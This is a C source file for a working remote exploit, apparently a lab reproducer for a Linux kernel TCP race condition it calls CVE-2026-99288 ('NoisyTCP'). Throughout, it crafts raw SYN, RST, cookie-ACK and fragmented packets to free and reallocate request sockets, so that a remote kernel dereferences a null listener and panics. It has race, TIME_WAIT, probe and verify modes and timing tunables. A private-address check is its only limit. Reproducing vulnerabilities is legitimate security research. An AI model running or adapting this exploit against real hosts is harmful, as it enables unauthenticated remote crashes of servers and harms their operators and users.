/*
 * noisytcp.c - lab reproducer for CVE-2026-99288 ("NoisyTCP")
 *
 * Pre-auth remote kernel corruption in the Linux TCP stack.
 *
 * __inet_lookup_established() is lockless.  After a tuple match it takes a
 * refcount and re-checks the tuple, but it never verifies that the socket it
 * just pinned is still hashed in the ehash bucket.  The request_sock slab is
 * SLAB_TYPESAFE_BY_RCU, so a slot can be freed and immediately reallocated
 * while a reader still holds its address.  If the new object is a SYN-cookie
 * request created in tcp_get_cookie_sock() - same 4-tuple, refcount set,
 * nobody hashed it, rsk_listener == NULL - the lookup passes both checks and
 * returns it.  tcp_v4_rcv() then dereferences the NULL listener and the kernel
 * panics inside the receive softirq.
 *
 * The trigger needs four things, all implemented below:
 *
 *   1. a hashed request socket R for tuple T (SYN, SYN queue has room);
 *   2. a valid SYN cookie C for the *same* tuple T (SYN while the SYN queue is
 *      full, so tcp_syncookies turns on; C stays valid ~120 s);
 *   3. free R (in-window RST for T) and reallocate the same slab slot with the
 *      cookie request (ACK carrying C) on the *same* RX context - consecutive
 *      packets on the same RPS-selected CPU hit the per-CPU slab freelist LIFO;
 *   4. a concurrent lookup of tuple T, running in a *different* RX context,
 *      that already loaded R's address and sits between its first tuple check
 *      and the refcount acquisition.  The lookup packet is sent as two IPv4
 *      fragments: a non-first fragment has a different RPS hash, so reassembly
 *      and TCP processing happen on another CPU than the plain control packets.
 *      RPS also makes that context preemptible (ksoftirqd), which widens the
 *      window the way a vCPU preemption does.
 *
 * Usage:
 *   noisytcp --victim 172.31.99.10 --port 8080 --backlog 8 --mode race
 *   noisytcp --victim 172.31.99.10 --port 8080 --mode probe
 *   noisytcp --victim 172.31.99.10 --port 8080 --mode verify
 *
 * Lab use only: the target must be loopback or RFC1918.
 *
 * Build: gcc -O2 -pthread -o noisytcp noisytcp.c
 */
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

#define TH_FIN 0x01
#define TH_SYN 0x02
#define TH_RST 0x04
#define TH_ACK 0x10
#define IP_MF 0x2000

#define FRAG_SPLIT 24 /* bytes in the first fragment (must be % 8) */

static uint32_t g_saddr, g_daddr; /* network byte order */
static uint16_t g_dport = 8080;
static int g_tx = -1, g_rx = -1;
static uint16_t g_ipid = 0x2000;
static volatile int g_stop;
static int g_frag_gap_us = 20;  /* frag0 -> frag1 */
static int g_free_gap_us = 0;   /* frag1 -> RST that frees R */
static int g_alloc_gap_us = 0;  /* RST -> cookie ACK that reallocates */
static int g_jitter_us = 6;     /* per-attempt random spread, phase sweep */
static int g_backlog = 8;
static int g_batch = 8;
static int g_duration = 120;
static int g_stress;
static int g_fixed_sport;   /* 0 = rolling ports */
static int g_plain;         /* fragtest: send plain instead of fragmented */
static int g_noise;        /* threads spraying packets to a closed port */
static uint16_t g_noise_port = 9999;

static uint64_t now_ns(void)
{
	struct timespec ts;

	clock_gettime(CLOCK_MONOTONIC, &ts);
	return (uint64_t)ts.tv_sec * 1000000000ull + (uint64_t)ts.tv_nsec;
}

static void busy_ns(uint64_t ns)
{
	uint64_t t0 = now_ns();

	while (now_ns() - t0 < ns)
		;
}

static int rand_us(int max)
{
	return max > 0 ? (int)(random() % (unsigned)max) : 0;
}

static uint32_t rnd32(void)
{
	return ((uint32_t)random() << 16) ^ (uint32_t)random();
}

static void wr16(uint8_t *p, uint16_t v)
{
	p[0] = v >> 8;
	p[1] = v & 0xff;
}

static void wr32(uint8_t *p, uint32_t v)
{
	p[0] = v >> 24;
	p[1] = (v >> 16) & 0xff;
	p[2] = (v >> 8) & 0xff;
	p[3] = v & 0xff;
}

static uint16_t rd16(const uint8_t *p)
{
	return ((uint16_t)p[0] << 8) | p[1];
}

static uint32_t rd32(const uint8_t *p)
{
	return ((uint32_t)p[0] << 24) | ((uint32_t)p[1] << 16) |
	       ((uint32_t)p[2] << 8) | p[3];
}

static uint32_t csum_add(const void *data, size_t len, uint32_t sum)
{
	const uint8_t *p = data;

	while (len > 1) {
		sum += ((uint32_t)p[0] << 8) | p[1];
		p += 2;
		len -= 2;
	}
	if (len)
		sum += (uint32_t)p[0] << 8;
	return sum;
}

static uint16_t csum_fold(uint32_t sum)
{
	while (sum >> 16)
		sum = (sum & 0xffff) + (sum >> 16);
	return (uint16_t)~sum;
}

static void emit_ip(const uint8_t *payload, int len, int frag_off8, int mf,
		    uint16_t ipid)
{
	uint8_t pkt[1600];
	int total = 20 + len;
	struct sockaddr_in dst;

	if (total > (int)sizeof(pkt))
		return;
	memset(pkt, 0, 20);
	pkt[0] = 0x45;
	wr16(pkt + 2, (uint16_t)total);
	wr16(pkt + 4, ipid);
	wr16(pkt + 6, (uint16_t)((frag_off8 & 0x1fff) | (mf ? IP_MF : 0)));
	pkt[8] = 64;
	pkt[9] = IPPROTO_TCP;
	memcpy(pkt + 12, &g_saddr, 4);
	memcpy(pkt + 16, &g_daddr, 4);
	wr16(pkt + 10, csum_fold(csum_add(pkt, 20, 0)));
	memcpy(pkt + 20, payload, len);

	memset(&dst, 0, sizeof dst);
	dst.sin_family = AF_INET;
	dst.sin_addr.s_addr = g_daddr;
	if (sendto(g_tx, pkt, total, 0, (struct sockaddr *)&dst, sizeof dst) < 0 &&
	    errno != EAGAIN && errno != ENOBUFS)
		fprintf(stderr, "sendto: %s (errno %d)\n", strerror(errno), errno);
}

/*
 * Send one TCP segment.
 *   part == 0  plain packet
 *   part == 1  first  fragment only (FRAG_SPLIT bytes, MF set)
 *   part == 2  second fragment only (offset FRAG_SPLIT/8)
 * Both fragments of one datagram must share ipid, otherwise the receiver
 * never reassembles them.
 */
static void send_seg_dp(uint16_t sport, uint32_t seq, uint32_t ack, uint8_t flags,
			int payload_len, int part, uint16_t ipid, uint16_t dport);

static void send_seg(uint16_t sport, uint32_t seq, uint32_t ack, uint8_t flags,
		     int payload_len, int part, uint16_t ipid)
{
	send_seg_dp(sport, seq, ack, flags, payload_len, part, ipid, g_dport);
}

static void send_seg_dp(uint16_t sport, uint32_t seq, uint32_t ack, uint8_t flags,
			int payload_len, int part, uint16_t ipid, uint16_t dport)
{
	uint8_t seg[128];
	uint8_t ph[4];
	int seglen = 20 + payload_len;
	uint32_t sum;

	if (seglen > (int)sizeof(seg))
		return;
	memset(seg, 0, sizeof seg);
	wr16(seg + 0, sport);
	wr16(seg + 2, dport);
	wr32(seg + 4, seq);
	wr32(seg + 8, ack);
	wr16(seg + 12, (uint16_t)((5u << 12) | flags));
	wr16(seg + 14, 65535);
	if (payload_len)
		memset(seg + 20, 'A', payload_len);

	sum = csum_add(&g_saddr, 4, 0);
	sum = csum_add(&g_daddr, 4, sum);
	ph[0] = 0;
	ph[1] = IPPROTO_TCP;
	wr16(ph + 2, (uint16_t)seglen);
	sum = csum_add(ph, 4, sum);
	wr16(seg + 16, csum_fold(csum_add(seg, seglen, sum)));

	if (part == 1)
		emit_ip(seg, FRAG_SPLIT, 0, 1, ipid);
	else if (part == 2)
		emit_ip(seg + FRAG_SPLIT, seglen - FRAG_SPLIT, FRAG_SPLIT / 8, 0,
			ipid);
	else
		emit_ip(seg, seglen, 0, 0, ipid);
}

/* ---- receive path --------------------------------------------------- */

/* Drain the raw socket; record server ISNs for the requested source ports. */
static int rx_collect(const uint16_t *ports, uint32_t *isn, int n, int timeout_us)
{
	uint8_t buf[2048];
	uint64_t end = now_ns() + (uint64_t)timeout_us * 1000ull;
	int found = 0;

	while (now_ns() < end && found < n) {
		ssize_t len = recv(g_rx, buf, sizeof buf, MSG_DONTWAIT);
		int ihl, sport;
		uint8_t *th;

		if (len < 40)
			continue;
		if (buf[9] != IPPROTO_TCP)
			continue;
		ihl = (buf[0] & 0x0f) * 4;
		if (len < ihl + 20)
			continue;
		th = buf + ihl;
		if ((th[13] & (TH_SYN | TH_ACK)) != (TH_SYN | TH_ACK))
			continue;
		sport = rd16(th + 2);
		for (int i = 0; i < n; i++) {
			if (ports[i] == sport && !isn[i]) {
				isn[i] = rd32(th + 4);
				found++;
				break;
			}
		}
	}
	return found;
}

/*
 * Wait for one specific segment sent to our source port.  Used by the
 * TIME_WAIT mode: we must see the listener's FIN and the ACK that confirms the
 * server really entered TIME_WAIT before relying on it.
 */
static int rx_wait_flags(uint16_t sport, uint8_t mask, uint8_t want,
			 uint32_t *seq, uint32_t *ack, int timeout_us)
{
	uint8_t buf[2048];
	uint64_t end = now_ns() + (uint64_t)timeout_us * 1000ull;

	while (now_ns() < end) {
		ssize_t len = recv(g_rx, buf, sizeof buf, MSG_DONTWAIT);
		int ihl;
		uint8_t *th;

		if (len < 40 || buf[9] != IPPROTO_TCP)
			continue;
		ihl = (buf[0] & 0x0f) * 4;
		if (len < ihl + 20)
			continue;
		th = buf + ihl;
		if (rd16(th + 2) != sport)
			continue;
		if ((th[13] & mask) != want)
			continue;
		if (seq)
			*seq = rd32(th + 4);
		if (ack)
			*ack = rd32(th + 8);
		return 1;
	}
	return 0;
}

static int rx_one(uint16_t sport, uint32_t *isn, int timeout_us)
{
	return rx_collect(&sport, isn, 1, timeout_us);
}

/* ---- SYN queue bookkeeping ------------------------------------------ */

#define MAXQ 8192
struct junk_req {
	uint16_t port;
	uint32_t seq;
};
static struct junk_req junk[MAXQ];
static int junk_n;
static uint16_t next_sport;

static uint16_t take_sport(void)
{
	if (next_sport < 32768 || next_sport > 60990)
		next_sport = 32768;
	return next_sport++;
}

/*
 * The tuple under attack.  With --fixed-sport it is pinned so the reader is
 * always steered to the same CPU (RPS hash depends on the whole 4-tuple) and
 * that CPU can then be hit with device interrupts.
 */
static uint16_t victim_port(void)
{
	return g_fixed_sport ? (uint16_t)g_fixed_sport : take_sport();
}

/* Drop every half-open request we know about (in-window RST: seq = isn + 1). */
static void junk_drain(void)
{
	for (int i = 0; i < junk_n; i++)
		send_seg(junk[i].port, junk[i].seq + 1, 0, TH_RST, 0, 0,
			 g_ipid++);
	junk_n = 0;
}

static void junk_fill(int n)
{
	for (int i = 0; i < n; i++) {
		uint16_t p = take_sport();
		uint32_t s = rnd32();

		send_seg(p, s, 0, TH_SYN, 0, 0, g_ipid++);
		if (junk_n < MAXQ) {
			junk[junk_n].port = p;
			junk[junk_n].seq = s;
			junk_n++;
		}
	}
}

/* ---- modes ---------------------------------------------------------- */

static unsigned long g_attempts, g_cookies, g_bursts, g_rounds;

static void print_addr(const char *tag, uint32_t a, uint16_t port)
{
	struct in_addr in;

	in.s_addr = a;
	printf("%s%s:%u", tag, inet_ntoa(in), port);
}

static int do_probe(void)
{
	uint32_t isn = 0;
	uint16_t sport = take_sport();
	uint32_t seq = rnd32();

	print_addr("[*] probe: SYN from ", g_saddr, sport);
	print_addr(" to ", g_daddr, g_dport);
	printf("\n");
	send_seg(sport, seq, 0, TH_SYN, 0, 0, g_ipid++);
	if (!rx_one(sport, &isn, 500000)) {
		printf("[-] no SYN-ACK (wrong port? netfilter?)\n");
		return 1;
	}
	printf("[+] SYN-ACK received, server ISN=0x%08x\n", isn);
	return 0;
}

/*
 * verify: run one complete cookie cycle.  Victim-side effect is checked from
 * run.sh through /proc/net/netstat (TcpExtSyncookiesSent/Recv/Failed) and by
 * the presence of a socket in SYN_RECV / ESTABLISHED.
 */
static int do_verify(void)
{
	uint32_t cookie = 0, isn = 0;
	uint16_t sport = victim_port();
	uint32_t s1 = rnd32(), s2 = rnd32();

	printf("[*] step 1: saturate SYN queue (%d SYNs)\n", g_backlog * 3);
	junk_fill(g_backlog * 3);
	busy_ns(20000000ull);

	printf("[*] step 2: harvest cookie for one tuple\n");
	send_seg(sport, s1, 0, TH_SYN, 0, 0, g_ipid++);
	if (!rx_one(sport, &cookie, 500000)) {
		printf("[-] no SYN-ACK for cookie harvest\n");
		return 1;
	}
	printf("[+] server ISN (cookie candidate) 0x%08x\n", cookie);

	printf("[*] step 3: free a slot, create hashed request socket\n");
	junk_drain();
	junk_fill(1); /* one queued junk request, dropped right away */
	junk_drain();
	send_seg(sport, s2, 0, TH_SYN, 0, 0, g_ipid++);
	if (rx_one(sport, &isn, 500000))
		printf("[+] request socket R created, ISN=0x%08x\n", isn);
	else
		printf("[!] no SYN-ACK for R creation\n");

	printf("[*] step 4: free R, then reallocate the slot with the cookie\n");
	send_seg(sport, s2 + 1, 0, TH_RST, 0, 0, g_ipid++);
	busy_ns(2000000ull);
	send_seg(sport, s1 + 1, cookie + 1, TH_ACK, 0, 0, g_ipid++);
	printf("[+] cookie ACK sent (seq=0x%08x ack=0x%08x)\n", s1 + 1,
	       cookie + 1);
	busy_ns(5000000ull);
	printf("[+] verify done\n");
	return 0;
}


/*
 * Noise: plain SYNs to a closed port with random source ports, so RPS steers
 * them over many CPUs.  On this kernel the steering IPI only raises the
 * NET_RX softirq flag while the target CPU is already in softirq, so it does
 * not stretch the lookup window; kept as a tunable for kernels that do run the
 * backlog inline.
 */

/* fragtest: does a fragmented packet land on a different CPU than a plain one? */
static int do_fragtest(void)
{
	int n = 300;

	printf("[*] fragtest: %d %s SYNs, sport %u -> ", n,
	       g_plain ? "plain" : "fragmented", (unsigned)take_sport());
	print_addr("", g_daddr, g_dport);
	printf("\n");
	for (int i = 0; i < n; i++) {
		uint16_t ipid = g_ipid++;
		uint16_t sp = take_sport();
		uint32_t s = rnd32();

		if (g_plain) {
			send_seg(sp, s, 0, TH_SYN, 16, 0, ipid);
		} else {
			send_seg(sp, s, 0, TH_SYN, 16, 1, ipid);
			busy_ns(5000);
			send_seg(sp, s, 0, TH_SYN, 16, 2, ipid);
		}
		busy_ns(200000);
	}
	sleep(1);
	printf("[+] fragtest done\n");
	return 0;
}

static void *noise_thread(void *arg)
{
	(void)arg;
	while (!g_stop) {
		uint64_t t0 = now_ns();

		for (int i = 0; i < 64; i++) {
			uint16_t p = 20000 + (uint16_t)(random() % 40000);

			send_seg_dp(p, rnd32(), 0, TH_SYN, 0, 0, g_ipid++,
				    g_noise_port);
		}
		while (now_ns() - t0 < 1200000ull && !g_stop)
			;
	}
	return NULL;
}

static void start_noise(int threads)
{
	pthread_t th;

	for (int i = 0; i < threads; i++)
		pthread_create(&th, NULL, noise_thread, NULL);
}

static void *stress_thread(void *arg)
{
	(void)arg;
	for (;;) {
		volatile unsigned long x = 0;

		for (int i = 0; i < 4096; i++)
			x += (unsigned long)i;
		sched_yield();
		if (g_stop)
			return NULL;
	}
}

/*
 * One race attempt, four adjacent packets so the kernel sees them within a
 * microsecond or two of each other:
 *   frag1   completes reassembly -> the lookup runs on an RPS-selected CPU
 *   RST     frees R on the CPU that owns the tuple
 *   ACK     carries the valid cookie: tcp_get_cookie_sock() reallocates the
 *           freed slab slot, unhashed, refcount set, rsk_listener == NULL
 *   RST     tuple cleanup, keeps the source port reusable
 * frag0 was sent earlier so reassembly is already pending.
 */
static void burst_start(uint16_t sport, uint32_t rseq)
{
	uint16_t ipid = g_ipid++;

	send_seg(sport, rseq, 0, TH_SYN, 16, 1, ipid);
}

static void burst_fire(uint16_t sport, uint32_t hseq, uint32_t cookie,
		       uint32_t rseq)
{
	uint16_t ipid = g_ipid++;

	send_seg(sport, rseq, 0, TH_SYN, 16, 2, ipid);
	if (g_free_gap_us > 0 || g_jitter_us > 0)
		busy_ns((uint64_t)(g_free_gap_us + rand_us(g_jitter_us)) * 1000ull);
	send_seg(sport, rseq + 1, 0, TH_RST, 0, 0, g_ipid++);
	if (g_alloc_gap_us > 0 || g_jitter_us > 0)
		busy_ns((uint64_t)(g_alloc_gap_us + rand_us(g_jitter_us)) * 1000ull);
	send_seg(sport, hseq + 1, cookie + 1, TH_ACK, 0, 0, g_ipid++);
	send_seg(sport, hseq + 1, 0, TH_RST, 0, 0, g_ipid++);
	g_bursts++;
}


/*
 * TIME_WAIT mode, for net.ipv4.tcp_syncookies=2.
 *
 * With syncookies=2 every SYN gets a cookie and the SYN queue stays empty, so
 * there is no control traffic at all.  A hashed request socket is still needed
 * as the free/realloc victim: tcp_conn_request() skips the cookie check when the
 * SYN was absorbed by a TIME_WAIT socket (isn = TCP_SKB_CB(skb)->tcp_tw_isn),
 * so we first drive tuple T into TIME_WAIT with a real close, then send a SYN
 * for T: the TW socket is destroyed and a hashed R appears.
 *
 *   1. SYN(T)                  -> SYN-ACK carrying the cookie C
 *   2. ACK(ack=C+1)            -> handshake completes, listener accepts+closes
 *   3. wait for FIN            -> server is in FIN_WAIT_1
 *   4. FIN|ACK(ack=F+1)        -> server goes to TIME_WAIT, sends its ACK
 *   5. wait for that ACK       -> TW confirmed
 *   6. SYN(T, s2)              -> TW converted: hashed R, listener attached
 *   7. race: frag lookup vs RST(free R) + cookie ACK(realloc)
 */
static void burst_start(uint16_t sport, uint32_t rseq);
static void burst_fire(uint16_t sport, uint32_t hseq, uint32_t cookie,
		       uint32_t rseq);

static int tw_attempt(void)
{
	uint16_t sport = take_sport();
	uint32_t cookie = 0, fseq = 0, fack = 0, aseq = 0, aack = 0, s2;
	uint32_t s1 = rnd32();

	/* 1. harvest a valid cookie */
	send_seg(sport, s1, 0, TH_SYN, 0, 0, g_ipid++);
	if (!rx_wait_flags(sport, TH_SYN | TH_ACK, TH_SYN | TH_ACK, &cookie,
			   NULL, 200000))
		return 0;
	g_cookies++;

	/* 2. complete the handshake: child in the accept queue */
	send_seg(sport, s1 + 1, cookie + 1, TH_ACK, 0, 0, g_ipid++);

	/* 3. the listener accepts and closes, so the server sends FIN */
	if (!rx_wait_flags(sport, TH_FIN, TH_FIN, &fseq, &fack, 300000))
		return 0;

	/*
	 * 4. ACK the FIN and our FIN must travel in *separate* segments: when
	 * both arrive in one packet while the socket is in FIN_WAIT_1, tcp_fin()
	 * takes the "bad case" branch and defers TIME_WAIT by the keepalive
	 * timer instead of creating the timewait socket right away.
	 */
	send_seg(sport, fack, fseq + 1, TH_ACK, 0, 0, g_ipid++);
	busy_ns(150000);
	send_seg(sport, fack, fseq + 1, TH_FIN | TH_ACK, 0, 0, g_ipid++);

	/* 5. confirm TIME_WAIT (server ACKs our FIN) */
	if (!rx_wait_flags(sport, TH_ACK, TH_ACK, &aseq, &aack, 300000))
		return 0;
	if (aack != fack + 1 || aseq != fseq + 1)
		return 0;

	/*
	 * 6. SYN absorbs the TIME_WAIT socket and creates a hashed request
	 * socket R.  tcp_timewait_state_process() converts only when
	 *     after(TCP_SKB_CB(skb)->seq, rcv_nxt) || timestamps
	 * holds, i.e. the ISN must be *strictly after* tw_rcv_nxt (s1 + 2 after
	 * our FIN).  Equal or random values leave the TIME_WAIT socket behind
	 * and flood the TW table.
	 */
	s2 = s1 + 3;
	send_seg(sport, s2, 0, TH_SYN, 0, 0, g_ipid++);
	busy_ns(20000);

	/* 7. race: seed the lookup, then free R and reallocate its slot */
	burst_start(sport, s2);
	busy_ns((uint64_t)(g_frag_gap_us + rand_us(g_jitter_us)) * 1000ull);
	burst_fire(sport, s1, cookie, s2);
	g_attempts++;
	return 1;
}

static int do_tw(void)
{
	uint64_t deadline = now_ns() + (uint64_t)g_duration * 1000000000ull;
	uint64_t t0 = now_ns();
	unsigned long rounds = 0;

	printf("[*] TIME_WAIT mode (needs net.ipv4.tcp_syncookies=2): ");
	print_addr("victim ", g_daddr, g_dport);
	printf(" dur=%ds\n", g_duration);
	fflush(stdout);

	while (now_ns() < deadline && !g_stop) {
		rounds++;
		tw_attempt();
		if ((rounds & 0x3f) == 0) {
			printf("[*] %5.1fs attempts=%lu cookies=%lu\n",
			       (double)(now_ns() - t0) / 1e9, g_attempts,
			       g_cookies);
			fflush(stdout);
		}
	}
	printf("[+] done: attempts=%lu cookies=%lu\n", g_attempts, g_cookies);
	return 0;
}

static int do_race(void)
{
	uint64_t deadline = now_ns() / 1000ull + (uint64_t)g_duration * 1000000ull;
	uint16_t batch[64];
	uint32_t hseq[64], cookie[64], rseq[64];
	int nb = g_batch > 64 ? 64 : g_batch;
	uint64_t t0 = now_ns();

	printf("[*] race: ");
	print_addr("victim ", g_daddr, g_dport);
	printf(" backlog=%d batch=%d dur=%ds gaps=%d/%d/%d +/-%dus\n", g_backlog,
	       nb, g_duration, g_frag_gap_us, g_free_gap_us, g_alloc_gap_us,
	       g_jitter_us);
	fflush(stdout);

	while (now_ns() / 1000ull < deadline && !g_stop) {
		g_rounds++;

		/* (a) empty the SYN queue, then saturate it again */
		junk_drain();
		junk_fill(g_backlog);
		busy_ns(1000);

		/* (b) one valid cookie per tuple, harvested while the queue is full */
		memset(cookie, 0, sizeof cookie);
		for (int i = 0; i < nb; i++) {
			batch[i] = victim_port();
			hseq[i] = rnd32();
			send_seg(batch[i], hseq[i], 0, TH_SYN, 0, 0, g_ipid++);
		}
		rx_collect(batch, cookie, nb, 30000);
		for (int i = 0; i < nb; i++)
			if (cookie[i])
				g_cookies++;

		/*
		 * (c) empty the queue completely, then create a hashed request
		 * socket per tuple.  A partially freed queue is not enough: if a
		 * single junk RST misses its request socket the tuple lands on the
		 * cookie path again and there is nothing for the race to free.
		 */
		junk_drain();
		busy_ns(1000);
		for (int i = 0; i < nb; i++) {
			if (!cookie[i])
				continue;
			rseq[i] = rnd32();
			send_seg(batch[i], rseq[i], 0, TH_SYN, 0, 0, g_ipid++);
		}
		busy_ns(1500);

		/*
		 * (d) race: all lookup packets are seeded first, then the
		 * free + reallocation of each tuple is fired in one tight burst
		 * so the two RX contexts overlap.
		 */
		for (int i = 0; i < nb; i++)
			if (cookie[i])
				burst_start(batch[i], rseq[i]);
		busy_ns((uint64_t)(g_frag_gap_us + rand_us(g_jitter_us)) * 1000ull);
		for (int i = 0; i < nb; i++) {
			if (!cookie[i])
				continue;
			burst_fire(batch[i], hseq[i], cookie[i], rseq[i]);
			g_attempts++;
		}

		if ((g_rounds & 0x3ff) == 0) {
			printf("[*] %5.1fs attempts=%lu cookies=%lu bursts=%lu\n",
			       (double)(now_ns() - t0) / 1e9, g_attempts,
			       g_cookies, g_bursts);
			fflush(stdout);
		}
	}
	printf("[+] done: attempts=%lu cookies=%lu bursts=%lu\n", g_attempts,
	       g_cookies, g_bursts);
	return 0;
}

/* ---- main ----------------------------------------------------------- */

static int is_private(uint32_t addr)
{
	const uint8_t *b = (const uint8_t *)&addr;

	if (b[0] == 127 || b[0] == 10)
		return 1;
	if (b[0] == 172 && b[1] >= 16 && b[1] <= 31)
		return 1;
	if (b[0] == 192 && b[1] == 168)
		return 1;
	return 0;
}

static void usage(const char *a0)
{
	printf("usage: %s --victim IP [--port 8080] [--mode probe|verify|race|tw]\n"
	       "          [--backlog 8] [--batch 4] [--duration 120]\n"
	       "          [--frag-gap-us 20] [--free-gap-us 1] [--alloc-gap-us 6]\n"
	       "          [--jitter-us 6] [--stress N] [--noise N]\n",
	       a0);
}

int main(int argc, char **argv)
{
	const char *victim = NULL, *mode = "probe";
	struct sockaddr_in sa;
	int one = 1;

	for (int i = 1; i < argc; i++) {
		if (!strcmp(argv[i], "--victim") && i + 1 < argc)
			victim = argv[++i];
		else if (!strcmp(argv[i], "--port") && i + 1 < argc)
			g_dport = (uint16_t)atoi(argv[++i]);
		else if (!strcmp(argv[i], "--mode") && i + 1 < argc)
			mode = argv[++i];
		else if (!strcmp(argv[i], "--backlog") && i + 1 < argc)
			g_backlog = atoi(argv[++i]);
		else if (!strcmp(argv[i], "--batch") && i + 1 < argc)
			g_batch = atoi(argv[++i]);
		else if (!strcmp(argv[i], "--duration") && i + 1 < argc)
			g_duration = atoi(argv[++i]);
		else if (!strcmp(argv[i], "--frag-gap-us") && i + 1 < argc)
			g_frag_gap_us = atoi(argv[++i]);
		else if (!strcmp(argv[i], "--free-gap-us") && i + 1 < argc)
			g_free_gap_us = atoi(argv[++i]);
		else if (!strcmp(argv[i], "--alloc-gap-us") && i + 1 < argc)
			g_alloc_gap_us = atoi(argv[++i]);
		else if (!strcmp(argv[i], "--jitter-us") && i + 1 < argc)
			g_jitter_us = atoi(argv[++i]);
		else if (!strcmp(argv[i], "--stress") && i + 1 < argc)
			g_stress = atoi(argv[++i]);
		else if (!strcmp(argv[i], "--fixed-sport") && i + 1 < argc)
			g_fixed_sport = atoi(argv[++i]);
		else if (!strcmp(argv[i], "--plain"))
			g_plain = 1;
		else if (!strcmp(argv[i], "--noise") && i + 1 < argc)
			g_noise = atoi(argv[++i]);
		else if (!strcmp(argv[i], "--noise-port") && i + 1 < argc)
			g_noise_port = (uint16_t)atoi(argv[++i]);
		else {
			usage(argv[0]);
			return 2;
		}
	}
	if (!victim) {
		usage(argv[0]);
		return 2;
	}

	memset(&sa, 0, sizeof sa);
	sa.sin_family = AF_INET;
	if (inet_pton(AF_INET, victim, &sa.sin_addr) != 1) {
		printf("[-] bad victim address\n");
		return 2;
	}
	if (!is_private(sa.sin_addr.s_addr)) {
		printf("[-] refusing non-private target (lab use only)\n");
		return 2;
	}
	g_daddr = sa.sin_addr.s_addr;

	g_tx = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	if (g_tx < 0) {
		perror("socket(IPPROTO_RAW)");
		return 1;
	}
	if (setsockopt(g_tx, IPPROTO_IP, IP_HDRINCL, &one, sizeof one) < 0) {
		perror("IP_HDRINCL");
		return 1;
	}
	/*
	 * Mark our crafted packets so the lab's "drop kernel-generated RSTs"
	 * rule (which keeps the victim's half-open request sockets alive) does
	 * not also eat the RSTs this tool sends on purpose.
	 */
	{
		uint32_t mark = 0x1;

		if (setsockopt(g_tx, SOL_SOCKET, SO_MARK, &mark, sizeof mark) < 0)
			perror("SO_MARK");
	}
	g_rx = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
	if (g_rx < 0) {
		perror("socket(IPPROTO_TCP)");
		return 1;
	}
	{
		int rcvbuf = 16 * 1024 * 1024;

		setsockopt(g_rx, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof rcvbuf);
	}

	/* learn our source address the same way the kernel would route it */
	{
		struct sockaddr_in probe;
		socklen_t sl = sizeof probe;

		memset(&probe, 0, sizeof probe);
		probe.sin_family = AF_INET;
		probe.sin_addr.s_addr = g_daddr;
		probe.sin_port = htons(g_dport);
		int fd = socket(AF_INET, SOCK_DGRAM, 0);

		connect(fd, (struct sockaddr *)&probe, sizeof probe);
		if (getsockname(fd, (struct sockaddr *)&probe, &sl) == 0)
			g_saddr = probe.sin_addr.s_addr;
		close(fd);
	}
	if (!g_saddr) {
		printf("[-] cannot determine source address\n");
		return 1;
	}
	srandom((unsigned)(now_ns() ^ (unsigned)getpid()));
	next_sport = (uint16_t)(32768 + (random() % 20000));

	printf("[*] ");
	print_addr("source ", g_saddr, 0);
	print_addr(" -> ", g_daddr, g_dport);
	printf("  mode=%s\n", mode);

	if (g_noise > 0) {
		printf("[*] %d noise threads -> port %u (RPS IPI spray)\n", g_noise,
		       g_noise_port);
	}
	if (g_stress > 0) {
		pthread_t th;

		for (int i = 0; i < g_stress; i++)
			pthread_create(&th, NULL, stress_thread, NULL);
		printf("[*] %d stress threads\n", g_stress);
	}

	if (g_noise > 0)
		start_noise(g_noise);

	if (!strcmp(mode, "probe"))
		return do_probe();
	if (!strcmp(mode, "verify"))
		return do_verify();
	if (!strcmp(mode, "race"))
		return do_race();
	if (!strcmp(mode, "tw"))
		return do_tw();
	if (!strcmp(mode, "fragtest"))
		return do_fragtest();
	usage(argv[0]);
	return 2;
}
